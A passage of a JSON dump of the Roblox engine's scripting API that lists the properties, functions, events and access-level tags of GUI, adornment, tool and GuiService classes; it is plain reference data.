ame":"y","Type":"int"}],"Name":"MouseEnter","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseLeave","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseMoved","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseWheelBackward","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseWheelForward","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[],"Name":"SelectionGained","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[],"Name":"SelectionLost","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"state","Type":"UserInputState"}],"Name":"TouchLongPress","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"totalTranslation","Type":"Vector2"},{"Name":"velocity","Type":"Vector2"},{"Name":"state","Type":"UserInputState"}],"Name":"TouchPan","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"scale","Type":"float"},{"Name":"velocity","Type":"float"},{"Name":"state","Type":"UserInputState"}],"Name":"TouchPinch","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"rotation","Type":"float"},{"Name":"velocity","Type":"float"},{"Name":"state","Type":"UserInputState"}],"Name":"TouchRotate","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"swipeDirection","Type":"SwipeDirection"},{"Name":"numberOfTouches","Type":"int"}],"Name":"TouchSwipe","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"}],"Name":"TouchTap","tags":[],"Class":"GuiObject","type":"Event"},{"Superclass":"GuiObject","type":"Class","Name":"Frame","tags":[]},{"ValueType":"FrameStyle","type":"Property","Name":"Style","tags":[],"Class":"Frame"},{"Superclass":"GuiObject","type":"Class","Name":"GuiButton","tags":["notbrowsable"]},{"ValueType":"bool","type":"Property","Name":"AutoButtonColor","tags":[],"Class":"GuiButton"},{"ValueType":"bool","type":"Property","Name":"Modal","tags":[],"Class":"GuiButton"},{"ValueType":"bool","type":"Property","Name":"Selected","tags":[],"Class":"GuiButton"},{"ValueType":"ButtonStyle","type":"Property","Name":"Style","tags":[],"Class":"GuiButton"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"verb","Default":null}],"Name":"SetVerb","tags":["RobloxScriptSecurity"],"Class":"GuiButton","type":"Function"},{"Arguments":[],"Name":"MouseButton1Click","tags":[],"Class":"GuiButton","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseButton1Down","tags":[],"Class":"GuiButton","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseButton1Up","tags":[],"Class":"GuiButton","type":"Event"},{"Arguments":[],"Name":"MouseButton2Click","tags":[],"Class":"GuiButton","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseButton2Down","tags":[],"Class":"GuiButton","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseButton2Up","tags":[],"Class":"GuiButton","type":"Event"},{"Superclass":"GuiButton","type":"Class","Name":"ImageButton","tags":[]},{"ValueType":"Content","type":"Property","Name":"Image","tags":[],"Class":"ImageButton"},{"ValueType":"Color3","type":"Property","Name":"ImageColor3","tags":[],"Class":"ImageButton"},{"ValueType":"Vector2","type":"Property","Name":"ImageRectOffset","tags":[],"Class":"ImageButton"},{"ValueType":"Vector2","type":"Property","Name":"ImageRectSize","tags":[],"Class":"ImageButton"},{"ValueType":"float","type":"Property","Name":"ImageTransparency","tags":[],"Class":"ImageButton"},{"ValueType":"ScaleType","type":"Property","Name":"ScaleType","tags":[],"Class":"ImageButton"},{"ValueType":"Rect2D","type":"Property","Name":"SliceCenter","tags":[],"Class":"ImageButton"},{"Superclass":"GuiButton","type":"Class","Name":"TextButton","tags":[]},{"ValueType":"Font","type":"Property","Name":"Font","tags":[],"Class":"TextButton"},{"ValueType":"FontSize","type":"Property","Name":"FontSize","tags":[],"Class":"TextButton"},{"ValueType":"string","type":"Property","Name":"Text","tags":[],"Class":"TextButton"},{"ValueType":"Vector2","type":"Property","Name":"TextBounds","tags":["readonly"],"Class":"TextButton"},{"ValueType":"BrickColor","type":"Property","Name":"TextColor","tags":["deprecated","hidden"],"Class":"TextButton"},{"ValueType":"Color3","type":"Property","Name":"TextColor3","tags":[],"Class":"TextButton"},{"ValueType":"bool","type":"Property","Name":"TextFits","tags":["readonly"],"Class":"TextButton"},{"ValueType":"bool","type":"Property","Name":"TextScaled","tags":[],"Class":"TextButton"},{"ValueType":"Color3","type":"Property","Name":"TextStrokeColor3","tags":[],"Class":"TextButton"},{"ValueType":"float","type":"Property","Name":"TextStrokeTransparency","tags":[],"Class":"TextButton"},{"ValueType":"float","type":"Property","Name":"TextTransparency","tags":[],"Class":"TextButton"},{"ValueType":"bool","type":"Property","Name":"TextWrap","tags":["deprecated"],"Class":"TextButton"},{"ValueType":"bool","type":"Property","Name":"TextWrapped","tags":[],"Class":"TextButton"},{"ValueType":"TextXAlignment","type":"Property","Name":"TextXAlignment","tags":[],"Class":"TextButton"},{"ValueType":"TextYAlignment","type":"Property","Name":"TextYAlignment","tags":[],"Class":"TextButton"},{"Superclass":"GuiObject","type":"Class","Name":"GuiLabel","tags":[]},{"Superclass":"GuiLabel","type":"Class","Name":"ImageLabel","tags":[]},{"ValueType":"Content","type":"Property","Name":"Image","tags":[],"Class":"ImageLabel"},{"ValueType":"Color3","type":"Property","Name":"ImageColor3","tags":[],"Class":"ImageLabel"},{"ValueType":"Vector2","type":"Property","Name":"ImageRectOffset","tags":[],"Class":"ImageLabel"},{"ValueType":"Vector2","type":"Property","Name":"ImageRectSize","tags":[],"Class":"ImageLabel"},{"ValueType":"float","type":"Property","Name":"ImageTransparency","tags":[],"Class":"ImageLabel"},{"ValueType":"ScaleType","type":"Property","Name":"ScaleType","tags":[],"Class":"ImageLabel"},{"ValueType":"Rect2D","type":"Property","Name":"SliceCenter","tags":[],"Class":"ImageLabel"},{"Superclass":"GuiLabel","type":"Class","Name":"TextLabel","tags":[]},{"ValueType":"Font","type":"Property","Name":"Font","tags":[],"Class":"TextLabel"},{"ValueType":"FontSize","type":"Property","Name":"FontSize","tags":[],"Class":"TextLabel"},{"ValueType":"string","type":"Property","Name":"Text","tags":[],"Class":"TextLabel"},{"ValueType":"Vector2","type":"Property","Name":"TextBounds","tags":["readonly"],"Class":"TextLabel"},{"ValueType":"BrickColor","type":"Property","Name":"TextColor","tags":["deprecated","hidden"],"Class":"TextLabel"},{"ValueType":"Color3","type":"Property","Name":"TextColor3","tags":[],"Class":"TextLabel"},{"ValueType":"bool","type":"Property","Name":"TextFits","tags":["readonly"],"Class":"TextLabel"},{"ValueType":"bool","type":"Property","Name":"TextScaled","tags":[],"Class":"TextLabel"},{"ValueType":"Color3","type":"Property","Name":"TextStrokeColor3","tags":[],"Class":"TextLabel"},{"ValueType":"float","type":"Property","Name":"TextStrokeTransparency","tags":[],"Class":"TextLabel"},{"ValueType":"float","type":"Property","Name":"TextTransparency","tags":[],"Class":"TextLabel"},{"ValueType":"bool","type":"Property","Name":"TextWrap","tags":["deprecated"],"Class":"TextLabel"},{"ValueType":"bool","type":"Property","Name":"TextWrapped","tags":[],"Class":"TextLabel"},{"ValueType":"TextXAlignment","type":"Property","Name":"TextXAlignment","tags":[],"Class":"TextLabel"},{"ValueType":"TextYAlignment","type":"Property","Name":"TextYAlignment","tags":[],"Class":"TextLabel"},{"Superclass":"GuiObject","type":"Class","Name":"Scale9Frame","tags":[]},{"ValueType":"Vector2int16","type":"Property","Name":"ScaleEdgeSize","tags":[],"Class":"Scale9Frame"},{"ValueType":"string","type":"Property","Name":"SlicePrefix","tags":[],"Class":"Scale9Frame"},{"Superclass":"GuiObject","type":"Class","Name":"ScrollingFrame","tags":[]},{"ValueType":"Vector2","type":"Property","Name":"AbsoluteWindowSize","tags":["readonly"],"Class":"ScrollingFrame"},{"ValueType":"Content","type":"Property","Name":"BottomImage","tags":[],"Class":"ScrollingFrame"},{"ValueType":"Vector2","type":"Property","Name":"CanvasPosition","tags":[],"Class":"ScrollingFrame"},{"ValueType":"UDim2","type":"Property","Name":"CanvasSize","tags":[],"Class":"ScrollingFrame"},{"ValueType":"Content","type":"Property","Name":"MidImage","tags":[],"Class":"ScrollingFrame"},{"ValueType":"int","type":"Property","Name":"ScrollBarThickness","tags":[],"Class":"ScrollingFrame"},{"ValueType":"bool","type":"Property","Name":"ScrollingEnabled","tags":[],"Class":"ScrollingFrame"},{"ValueType":"Content","type":"Property","Name":"TopImage","tags":[],"Class":"ScrollingFrame"},{"Superclass":"GuiObject","type":"Class","Name":"TextBox","tags":[]},{"ValueType":"bool","type":"Property","Name":"ClearTextOnFocus","tags":[],"Class":"TextBox"},{"ValueType":"Font","type":"Property","Name":"Font","tags":[],"Class":"TextBox"},{"ValueType":"FontSize","type":"Property","Name":"FontSize","tags":[],"Class":"TextBox"},{"ValueType":"bool","type":"Property","Name":"MultiLine","tags":[],"Class":"TextBox"},{"ValueType":"string","type":"Property","Name":"Text","tags":[],"Class":"TextBox"},{"ValueType":"Vector2","type":"Property","Name":"TextBounds","tags":["readonly"],"Class":"TextBox"},{"ValueType":"BrickColor","type":"Property","Name":"TextColor","tags":["deprecated","hidden"],"Class":"TextBox"},{"ValueType":"Color3","type":"Property","Name":"TextColor3","tags":[],"Class":"TextBox"},{"ValueType":"bool","type":"Property","Name":"TextFits","tags":["readonly"],"Class":"TextBox"},{"ValueType":"bool","type":"Property","Name":"TextScaled","tags":[],"Class":"TextBox"},{"ValueType":"Color3","type":"Property","Name":"TextStrokeColor3","tags":[],"Class":"TextBox"},{"ValueType":"float","type":"Property","Name":"TextStrokeTransparency","tags":[],"Class":"TextBox"},{"ValueType":"float","type":"Property","Name":"TextTransparency","tags":[],"Class":"TextBox"},{"ValueType":"bool","type":"Property","Name":"TextWrap","tags":["deprecated"],"Class":"TextBox"},{"ValueType":"bool","type":"Property","Name":"TextWrapped","tags":[],"Class":"TextBox"},{"ValueType":"TextXAlignment","type":"Property","Name":"TextXAlignment","tags":[],"Class":"TextBox"},{"ValueType":"TextYAlignment","type":"Property","Name":"TextYAlignment","tags":[],"Class":"TextBox"},{"ReturnType":"void","Arguments":[],"Name":"CaptureFocus","tags":[],"Class":"TextBox","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsFocused","tags":[],"Class":"TextBox","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ReleaseFocus","tags":[],"Class":"TextBox","type":"Function"},{"Arguments":[{"Name":"enterPressed","Type":"bool"},{"Name":"inputThatCausedFocusLoss","Type":"Instance"}],"Name":"FocusLost","tags":[],"Class":"TextBox","type":"Event"},{"Arguments":[],"Name":"Focused","tags":[],"Class":"TextBox","type":"Event"},{"Superclass":"GuiBase2d","type":"Class","Name":"LayerCollector","tags":[]},{"Superclass":"LayerCollector","type":"Class","Name":"BillboardGui","tags":[]},{"ValueType":"bool","type":"Property","Name":"Active","tags":[],"Class":"BillboardGui"},{"ValueType":"Object","type":"Property","Name":"Adornee","tags":[],"Class":"BillboardGui"},{"ValueType":"bool","type":"Property","Name":"AlwaysOnTop","tags":[],"Class":"BillboardGui"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"BillboardGui"},{"ValueType":"Vector3","type":"Property","Name":"ExtentsOffset","tags":[],"Class":"BillboardGui"},{"ValueType":"Object","type":"Property","Name":"PlayerToHideFrom","tags":[],"Class":"BillboardGui"},{"ValueType":"UDim2","type":"Property","Name":"Size","tags":[],"Class":"BillboardGui"},{"ValueType":"Vector2","type":"Property","Name":"SizeOffset","tags":[],"Class":"BillboardGui"},{"ValueType":"Vector3","type":"Property","Name":"StudsOffset","tags":[],"Class":"BillboardGui"},{"Superclass":"LayerCollector","type":"Class","Name":"ScreenGui","tags":[]},{"Superclass":"ScreenGui","type":"Class","Name":"GuiMain","tags":["deprecated"]},{"Superclass":"LayerCollector","type":"Class","Name":"SurfaceGui","tags":[]},{"ValueType":"bool","type":"Property","Name":"Active","tags":[],"Class":"SurfaceGui"},{"ValueType":"Object","type":"Property","Name":"Adornee","tags":[],"Class":"SurfaceGui"},{"ValueType":"bool","type":"Property","Name":"AlwaysOnTop","tags":[],"Class":"SurfaceGui"},{"ValueType":"Vector2","type":"Property","Name":"CanvasSize","tags":[],"Class":"SurfaceGui"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"SurfaceGui"},{"ValueType":"NormalId","type":"Property","Name":"Face","tags":[],"Class":"SurfaceGui"},{"ValueType":"float","type":"Property","Name":"ToolPunchThroughDistance","tags":[],"Class":"SurfaceGui"},{"Superclass":"GuiBase","type":"Class","Name":"GuiBase3d","tags":[]},{"ValueType":"BrickColor","type":"Property","Name":"Color","tags":["deprecated","hidden"],"Class":"GuiBase3d"},{"ValueType":"Color3","type":"Property","Name":"Color3","tags":[],"Class":"GuiBase3d"},{"ValueType":"float","type":"Property","Name":"Transparency","tags":[],"Class":"GuiBase3d"},{"ValueType":"bool","type":"Property","Name":"Visible","tags":[],"Class":"GuiBase3d"},{"Superclass":"GuiBase3d","type":"Class","Name":"FloorWire","tags":["deprecated"]},{"ValueType":"float","type":"Property","Name":"CycleOffset","tags":[],"Class":"FloorWire"},{"ValueType":"Object","type":"Property","Name":"From","tags":[],"Class":"FloorWire"},{"ValueType":"float","type":"Property","Name":"StudsBetweenTextures","tags":[],"Class":"FloorWire"},{"ValueType":"Content","type":"Property","Name":"Texture","tags":[],"Class":"FloorWire"},{"ValueType":"Vector2","type":"Property","Name":"TextureSize","tags":[],"Class":"FloorWire"},{"ValueType":"Object","type":"Property","Name":"To","tags":[],"Class":"FloorWire"},{"ValueType":"float","type":"Property","Name":"Velocity","tags":[],"Class":"FloorWire"},{"ValueType":"float","type":"Property","Name":"WireRadius","tags":[],"Class":"FloorWire"},{"Superclass":"GuiBase3d","type":"Class","Name":"PVAdornment","tags":[]},{"ValueType":"Object","type":"Property","Name":"Adornee","tags":[],"Class":"PVAdornment"},{"Superclass":"PVAdornment","type":"Class","Name":"HandleAdornment","tags":[]},{"ValueType":"bool","type":"Property","Name":"AlwaysOnTop","tags":[],"Class":"HandleAdornment"},{"ValueType":"CoordinateFrame","type":"Property","Name":"CFrame","tags":[],"Class":"HandleAdornment"},{"ValueType":"Vector3","type":"Property","Name":"SizeRelativeOffset","tags":[],"Class":"HandleAdornment"},{"ValueType":"int","type":"Property","Name":"ZIndex","tags":[],"Class":"HandleAdornment"},{"Arguments":[],"Name":"MouseButton1Down","tags":[],"Class":"HandleAdornment","type":"Event"},{"Arguments":[],"Name":"MouseButton1Up","tags":[],"Class":"HandleAdornment","type":"Event"},{"Arguments":[],"Name":"MouseEnter","tags":[],"Class":"HandleAdornment","type":"Event"},{"Arguments":[],"Name":"MouseLeave","tags":[],"Class":"HandleAdornment","type":"Event"},{"Superclass":"HandleAdornment","type":"Class","Name":"BoxHandleAdornment","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"Size","tags":[],"Class":"BoxHandleAdornment"},{"Superclass":"HandleAdornment","type":"Class","Name":"ConeHandleAdornment","tags":[]},{"ValueType":"float","type":"Property","Name":"Height","tags":[],"Class":"ConeHandleAdornment"},{"ValueType":"float","type":"Property","Name":"Radius","tags":[],"Class":"ConeHandleAdornment"},{"Superclass":"HandleAdornment","type":"Class","Name":"CylinderHandleAdornment","tags":[]},{"ValueType":"float","type":"Property","Name":"Height","tags":[],"Class":"CylinderHandleAdornment"},{"ValueType":"float","type":"Property","Name":"Radius","tags":[],"Class":"CylinderHandleAdornment"},{"Superclass":"HandleAdornment","type":"Class","Name":"ImageHandleAdornment","tags":[]},{"ValueType":"Content","type":"Property","Name":"Image","tags":[],"Class":"ImageHandleAdornment"},{"ValueType":"Vector2","type":"Property","Name":"Size","tags":[],"Class":"ImageHandleAdornment"},{"Superclass":"HandleAdornment","type":"Class","Name":"LineHandleAdornment","tags":[]},{"ValueType":"float","type":"Property","Name":"Length","tags":[],"Class":"LineHandleAdornment"},{"ValueType":"float","type":"Property","Name":"Thickness","tags":[],"Class":"LineHandleAdornment"},{"Superclass":"HandleAdornment","type":"Class","Name":"SphereHandleAdornment","tags":[]},{"ValueType":"float","type":"Property","Name":"Radius","tags":[],"Class":"SphereHandleAdornment"},{"Superclass":"PVAdornment","type":"Class","Name":"SelectionBox","tags":[]},{"ValueType":"float","type":"Property","Name":"LineThickness","tags":[],"Class":"SelectionBox"},{"ValueType":"BrickColor","type":"Property","Name":"SurfaceColor","tags":["deprecated","hidden"],"Class":"SelectionBox"},{"ValueType":"Color3","type":"Property","Name":"SurfaceColor3","tags":[],"Class":"SelectionBox"},{"ValueType":"float","type":"Property","Name":"SurfaceTransparency","tags":[],"Class":"SelectionBox"},{"Superclass":"PVAdornment","type":"Class","Name":"SelectionSphere","tags":[]},{"ValueType":"BrickColor","type":"Property","Name":"SurfaceColor","tags":["deprecated","hidden"],"Class":"SelectionSphere"},{"ValueType":"Color3","type":"Property","Name":"SurfaceColor3","tags":[],"Class":"SelectionSphere"},{"ValueType":"float","type":"Property","Name":"SurfaceTransparency","tags":[],"Class":"SelectionSphere"},{"Superclass":"GuiBase3d","type":"Class","Name":"PartAdornment","tags":[]},{"ValueType":"Object","type":"Property","Name":"Adornee","tags":[],"Class":"PartAdornment"},{"Superclass":"PartAdornment","type":"Class","Name":"HandlesBase","tags":[]},{"Superclass":"HandlesBase","type":"Class","Name":"ArcHandles","tags":[]},{"ValueType":"Axes","type":"Property","Name":"Axes","tags":[],"Class":"ArcHandles"},{"Arguments":[{"Name":"axis","Type":"Axis"}],"Name":"MouseButton1Down","tags":[],"Class":"ArcHandles","type":"Event"},{"Arguments":[{"Name":"axis","Type":"Axis"}],"Name":"MouseButton1Up","tags":[],"Class":"ArcHandles","type":"Event"},{"Arguments":[{"Name":"axis","Type":"Axis"},{"Name":"relativeAngle","Type":"float"},{"Name":"deltaRadius","Type":"float"}],"Name":"MouseDrag","tags":[],"Class":"ArcHandles","type":"Event"},{"Arguments":[{"Name":"axis","Type":"Axis"}],"Name":"MouseEnter","tags":[],"Class":"ArcHandles","type":"Event"},{"Arguments":[{"Name":"axis","Type":"Axis"}],"Name":"MouseLeave","tags":[],"Class":"ArcHandles","type":"Event"},{"Superclass":"HandlesBase","type":"Class","Name":"Handles","tags":[]},{"ValueType":"Faces","type":"Property","Name":"Faces","tags":[],"Class":"Handles"},{"ValueType":"HandlesStyle","type":"Property","Name":"Style","tags":[],"Class":"Handles"},{"Arguments":[{"Name":"face","Type":"NormalId"}],"Name":"MouseButton1Down","tags":[],"Class":"Handles","type":"Event"},{"Arguments":[{"Name":"face","Type":"NormalId"}],"Name":"MouseButton1Up","tags":[],"Class":"Handles","type":"Event"},{"Arguments":[{"Name":"face","Type":"NormalId"},{"Name":"distance","Type":"float"}],"Name":"MouseDrag","tags":[],"Class":"Handles","type":"Event"},{"Arguments":[{"Name":"face","Type":"NormalId"}],"Name":"MouseEnter","tags":[],"Class":"Handles","type":"Event"},{"Arguments":[{"Name":"face","Type":"NormalId"}],"Name":"MouseLeave","tags":[],"Class":"Handles","type":"Event"},{"Superclass":"PartAdornment","type":"Class","Name":"SurfaceSelection","tags":[]},{"ValueType":"NormalId","type":"Property","Name":"TargetSurface","tags":[],"Class":"SurfaceSelection"},{"Superclass":"GuiBase3d","type":"Class","Name":"SelectionLasso","tags":[]},{"ValueType":"Object","type":"Property","Name":"Humanoid","tags":[],"Class":"SelectionLasso"},{"Superclass":"SelectionLasso","type":"Class","Name":"SelectionPartLasso","tags":["deprecated"]},{"ValueType":"Object","type":"Property","Name":"Part","tags":[],"Class":"SelectionPartLasso"},{"Superclass":"SelectionLasso","type":"Class","Name":"SelectionPointLasso","tags":["deprecated"]},{"ValueType":"Vector3","type":"Property","Name":"Point","tags":[],"Class":"SelectionPointLasso"},{"Superclass":"GuiBase3d","type":"Class","Name":"TextureTrail","tags":["deprecated"]},{"ValueType":"float","type":"Property","Name":"CycleOffset","tags":["RobloxPlaceSecurity"],"Class":"TextureTrail"},{"ValueType":"Object","type":"Property","Name":"From","tags":["RobloxPlaceSecurity"],"Class":"TextureTrail"},{"ValueType":"float","type":"Property","Name":"StudsBetweenTextures","tags":["RobloxPlaceSecurity"],"Class":"TextureTrail"},{"ValueType":"Content","type":"Property","Name":"Texture","tags":["RobloxPlaceSecurity"],"Class":"TextureTrail"},{"ValueType":"Vector2","type":"Property","Name":"TextureSize","tags":["RobloxPlaceSecurity"],"Class":"TextureTrail"},{"ValueType":"Object","type":"Property","Name":"To","tags":["RobloxPlaceSecurity"],"Class":"TextureTrail"},{"ValueType":"float","type":"Property","Name":"Velocity","tags":["RobloxPlaceSecurity"],"Class":"TextureTrail"},{"Superclass":"Instance","type":"Class","Name":"GuiItem","tags":[]},{"Superclass":"GuiItem","type":"Class","Name":"Backpack","tags":[]},{"Superclass":"GuiItem","type":"Class","Name":"BackpackItem","tags":[]},{"ValueType":"Content","type":"Property","Name":"TextureId","tags":[],"Class":"BackpackItem"},{"Superclass":"BackpackItem","type":"Class","Name":"HopperBin","tags":["deprecated"]},{"ValueType":"bool","type":"Property","Name":"Active","tags":[],"Class":"HopperBin"},{"ValueType":"BinType","type":"Property","Name":"BinType","tags":[],"Class":"HopperBin"},{"ReturnType":"void","Arguments":[],"Name":"Disable","tags":["RobloxScriptSecurity"],"Class":"HopperBin","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ToggleSelect","tags":["RobloxScriptSecurity"],"Class":"HopperBin","type":"Function"},{"Arguments":[],"Name":"Deselected","tags":[],"Class":"HopperBin","type":"Event"},{"Arguments":[{"Name":"mouse","Type":"Instance"}],"Name":"Selected","tags":[],"Class":"HopperBin","type":"Event"},{"Superclass":"BackpackItem","type":"Class","Name":"Tool","tags":[]},{"ValueType":"bool","type":"Property","Name":"CanBeDropped","tags":[],"Class":"Tool"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"Tool"},{"ValueType":"CoordinateFrame","type":"Property","Name":"Grip","tags":[],"Class":"Tool"},{"ValueType":"Vector3","type":"Property","Name":"GripForward","tags":[],"Class":"Tool"},{"ValueType":"Vector3","type":"Property","Name":"GripPos","tags":[],"Class":"Tool"},{"ValueType":"Vector3","type":"Property","Name":"GripRight","tags":[],"Class":"Tool"},{"ValueType":"Vector3","type":"Property","Name":"GripUp","tags":[],"Class":"Tool"},{"ValueType":"bool","type":"Property","Name":"ManualActivationOnly","tags":[],"Class":"Tool"},{"ValueType":"bool","type":"Property","Name":"RequiresHandle","tags":[],"Class":"Tool"},{"ValueType":"string","type":"Property","Name":"ToolTip","tags":[],"Class":"Tool"},{"ReturnType":"void","Arguments":[],"Name":"Activate","tags":[],"Class":"Tool","type":"Function"},{"Arguments":[],"Name":"Activated","tags":[],"Class":"Tool","type":"Event"},{"Arguments":[],"Name":"Deactivated","tags":[],"Class":"Tool","type":"Event"},{"Arguments":[{"Name":"mouse","Type":"Instance"}],"Name":"Equipped","tags":[],"Class":"Tool","type":"Event"},{"Arguments":[],"Name":"Unequipped","tags":[],"Class":"Tool","type":"Event"},{"Superclass":"Tool","type":"Class","Name":"Flag","tags":["deprecated"]},{"ValueType":"BrickColor","type":"Property","Name":"TeamColor","tags":[],"Class":"Flag"},{"Superclass":"GuiItem","type":"Class","Name":"ButtonBindingWidget","tags":[]},{"Superclass":"GuiItem","type":"Class","Name":"GuiRoot","tags":["notCreatable"]},{"Superclass":"GuiItem","type":"Class","Name":"Hopper","tags":["deprecated"]},{"Superclass":"GuiItem","type":"Class","Name":"StarterPack","tags":[]},{"Superclass":"Instance","type":"Class","Name":"GuiService","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"AutoSelectGuiEnabled","tags":[],"Class":"GuiService"},{"ValueType":"bool","type":"Property","Name":"CoreGuiNavigationEnabled","tags":[],"Class":"GuiService"},{"ValueType":"bool","type":"Property","Name":"GuiNavigationEnabled","tags":[],"Class":"GuiService"},{"ValueType":"bool","type":"Property","Name":"IsModalDialog","tags":["deprecated","readonly"],"Class":"GuiService"},{"ValueType":"bool","type":"Property","Name":"IsWindows","tags":["deprecated","readonly"],"Class":"GuiService"},{"ValueType":"bool","type":"Property","Name":"MenuIsOpen","tags":["readonly"],"Class":"GuiService"},{"ValueType":"bool","type":"Property","Name":"ScreenGuiEnabled","tags":["RobloxScriptSecurity"],"Class":"GuiService"},{"ValueType":"Object","type":"Property","Name":"SelectedCoreObject","tags":["RobloxScriptSecurity"],"Class":"GuiService"},{"ValueType":"Object","type":"Property","Name":"SelectedObject","tags":[],"Class":"GuiService"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"dialog","Default":null},{"Type":"CenterDialogType","Name":"centerDialogType","Default":null},{"Type":"Function","Name":"showFunction","Default":null},{"Type":"Function","Name":"hideFunction","Default":null}],"Name":"AddCenterDialog","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"AddKey","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"selectionName","Default":null},{"Type":"Instance","Name":"selectionParent","Default":null}],"Name":"AddSelectionParent","tags":[],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"selectionName","Default":null},{"Type":"Tuple","Name":"selections","Default":null}],"Name":"AddSelectionTuple","tags":[],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"SpecialKey","Name":"key","Default":null}],"Name":"AddSpecialKey","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"int","Arguments":[],"Name":"GetBrickCount","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Vector3","Name":"position","Default":null}],"Name":"GetClosestDialogToPosition","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetErrorMessage","tags":["RobloxScriptSecurity","deprecated"],"Class":"GuiService","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetUiMessage","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsTenFootInterface","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"OpenBrowserWindow","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"dialog","Default":null}],"Name":"RemoveCenterDialog","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"RemoveKey","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"selectionName","Default":null}],"Name":"RemoveSelectionGroup","tags":[],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"SpecialKey","Name":"key","Default":null}],"Name":"RemoveSpecialKey","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"errorMessage","Default":null}],"Name":"SetErrorMessage","tags":["LocalUserSecurity","deprecated"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"x1","Default":null},{"Type":"int","Name":"y1","Default":null},{"Type":"int","Name":"x2","Default":null},{"Type":"int","Name":"y2","Default":null}],"Name":"SetGlobalGuiInset","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"open","Default":null}],"Name":"SetMenuIsOpen","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"UiMessageType","Name":"msgType","Default":null},{"Type":"string","Name":"uiMessage","Default":null}],"Name":"SetUiMessage","tags":["LocalUserSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"input","Default":null}],"Name":"ShowStatsBasedOnInputString","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ToggleFullscreen","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"Vector2","Arguments":[],"Name":"GetScreenResolution","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"YieldFunction"},{"Arguments":[],"Name":"BrowserWindowClosed","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Event"},{"Arguments":[{"Name":"newErrorMessage","Type":"string"}],"Name":"ErrorMessageChanged","tags":["RobloxScriptSecurity","deprecated"],"Class":"GuiService","type":"Event"},{"Arguments":[],"Name":"EscapeKeyPressed","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Event"},{"Arguments":[{"Name":"key","Type":"string"},{"Name":"modifiers","Type":"string"}],"Name":"KeyPressed","tags":["RobloxScriptSecurity"],"Class":"G